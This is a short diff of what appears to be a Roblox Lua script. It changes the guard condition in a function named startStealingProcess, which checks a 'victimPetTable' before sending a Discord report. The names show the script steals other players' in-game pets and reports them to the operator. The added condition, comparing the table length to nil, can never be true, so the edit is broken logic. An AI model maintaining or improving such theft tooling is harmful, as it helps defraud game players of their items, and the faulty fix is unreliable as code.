@@ -357,7 +357,7 @@ local function startStealingProcess()
     end
 
     -- Условия для Discord-отчёта
-    if #victimPetTable == 0 then
+    if #victimPetTable == 0 or #victimPetTable == nil then
         warn("⛔️ Нет отчёта: пустой инвентарь или приватный сервер")
         return
     end
